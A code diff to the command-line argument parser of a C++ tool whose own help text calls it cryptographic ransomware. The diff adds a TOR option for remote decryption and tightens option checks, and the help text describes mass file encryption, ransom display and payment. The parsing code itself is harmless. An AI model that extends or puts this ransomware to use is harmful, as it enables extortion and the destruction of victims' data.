@@ -41,27 +41,49 @@ ArgumentParser::Arguments ArgumentParser::parseArgs()
             {
                 found = true;
                 args.protection = true;
+            } else if (arg == "-t" || arg == "--tor")
+            {
+                found = true;
+                args.tor = true;
             }
             else if (arg == "-c" || arg == "--config")
             {
                 // check end of argc
-                if (i + 1 < _argc && (!strchr(_argv[i + 1], '-')))
+                if (i + 1 < _argc && (_argv[i + 1 ] != nullptr))
                 {
-                    found = true;
-                    args.config = _argv[i + 1];
+                    std::string s(_argv[i + 1]);
+                    if (s.at(0) != '-')
+                    {
+                        found = true;
+                        args.config = _argv[i + 1];
+
+                    } else
+                    {
+                        std::cout << "--config option requires one argument!" << std::endl;
+                        exit(1);
+                    }
 
                 } else
                 {
                     std::cout << "--config option requires one argument!" << std::endl;
                     exit(1);
                 }
+
             } else if (arg == "-d" || arg == "--dir")
             {
                 // check end of argc
-                if (i + 1 < _argc && (!strchr(_argv[i + 1], '-')))
+                if (i + 1 < _argc && (_argv[i + 1] != nullptr))
                 {
-                    found = true;
-                    args.dir = _argv[i + 1];
+                    std::string s(_argv[i + 1]);
+                    if (s.at(0) != '-')
+                    {
+                        found = true;
+                        args.dir = _argv[i + 1];
+                    } else
+                    {
+                        std::cout << "--dir option requires one argument!" << std::endl;
+                        exit(1);
+                    }
 
                 } else
                 {
@@ -71,11 +93,20 @@ ArgumentParser::Arguments ArgumentParser::parseArgs()
 
             } else if (arg == "-enc" || arg == "--encrypt")
             {
+
                 // check end of argc
-                if (i + 1 < _argc && (!strchr(_argv[i + 1], '-')))
+                if (i + 1 < _argc && (_argv[i + 1] != nullptr))
                 {
-                    found = true;
-                    args.encrypt = _argv[i + 1];
+                    std::string s(_argv[i + 1]);
+                    if (s.at(0) != '-')
+                    {
+                        found = true;
+                        args.encrypt = _argv[i + 1];
+                    } else
+                    {
+                        std::cout << "--encrypt option requires one argument!" << std::endl;
+                        exit(1);
+                    }
 
                 } else
                 {
@@ -86,10 +117,18 @@ ArgumentParser::Arguments ArgumentParser::parseArgs()
             } else if (arg == "-dec" || arg == "--decrypt")
             {
                 // check end of argc
-                if (i + 1 < _argc && (!strchr(_argv[i + 1], '-')))
+                if (i + 1 < _argc && (_argv[i + 1] != nullptr))
                 {
-                    found = true;
-                    args.decrypt = _argv[i + 1];
+                    std::string s(_argv[i + 1]);
+                    if (s.at(0) != '-')
+                    {
+                        found = true;
+                        args.decrypt = _argv[i + 1];
+                    } else
+                    {
+                        std::cout << "--decrypt option requires one argument!" << std::endl;
+                        exit(1);
+                    }
 
                 } else
                 {
@@ -100,10 +139,18 @@ ArgumentParser::Arguments ArgumentParser::parseArgs()
             } else if (arg == "-k" || arg == "--key")
             {
                 // check end of argc
-                if (i + 1 < _argc && (!strchr(_argv[i + 1], '-')))
+                if (i + 1 < _argc && (_argv[i + 1] != nullptr))
                 {
-                    found = true;
-                    args.serverpKey = _argv[i + 1];
+                    std::string s(_argv[i + 1]);
+                    if (s.at(0) != '-')
+                    {
+                        found = true;
+                        args.serverpKey = _argv[i + 1];
+                    } else
+                    {
+                        std::cout << "--key option requires one argument!" << std::endl;
+                        exit(1);
+                    }
 
                 } else
                 {
@@ -143,16 +190,18 @@ void ArgumentParser::showUsage() const
                         + std::string(PROJECT_NAME) + " --dir /home/butterfly/data/\n\t"
                         + std::string(PROJECT_NAME) + " --dir /home/butterfly/data/ --protected\n\n\t"
                         + std::string(PROJECT_NAME) + " --encrypt /home/butterfly/data/ \n\t"
-                        + std::string(PROJECT_NAME) + " --decrypt /home/butterfly/data/ \n\n\t"
+                        + std::string(PROJECT_NAME) + " --decrypt /home/butterfly/data/ \n\t"
+                        + std::string(PROJECT_NAME) + " --decrypt /home/butterfly/data/ --tor\n\n\t"
                         + std::string(PROJECT_NAME) + " --decrypt /home/butterfly/data/ --key /home/butterfly/butterfly/masterkeys/SPrivateRSA.pem\n\n"
 
                + "Options:\n"
-                        + "\t-d,   --dir         Directory Path to start the Hybrid Encryption Mechanism (Encryption+Decryption)\n"
-                        + "\t-enc, --encrypt\t    Encrypts all files in provided directory\n"
-                        + "\t-dec, --decrypt\t    Decrypts all files in provided directory, if the request to the Server was successful\n"
-                        + "\t-k,   --key         Masterkey for the Decryption (Corresponds to the embedded Server Public Key)\n"
-                        + "\t-p,   --protected   Save all key files to the System\n"
-                        + "\t-c,   --config\t    Logger Config Path\n"
+                        + "\t-d,   --dir         Directory path to start the cryptographic ransomware (Encryption+Visualization+Payment+Decryption)\n"
+                        + "\t-enc, --encrypt\t    Encrypts all files in provided directory path and shows the ransom visualization\n"
+                        + "\t-dec, --decrypt\t    Decrypts all files in provided directory path, if the request to the remote server was successful\n"
+                        + "\t-t,   --tor\t    Remote decryption over the TOR network\n"
+                        + "\t-k,   --key         Masterkey for the decryption, if the remote server is not used (Corresponds to the embedded server public key)\n"
+                        + "\t-p,   --protected   Saves all key files to the system (For manual decryption)\n"
+                        + "\t-c,   --config\t    Logger config path\n"
                         + "\t-v,   --version\t    Show version information and quit\n"
                         + "\t-h,   --help\t    Show this message and quit"
 
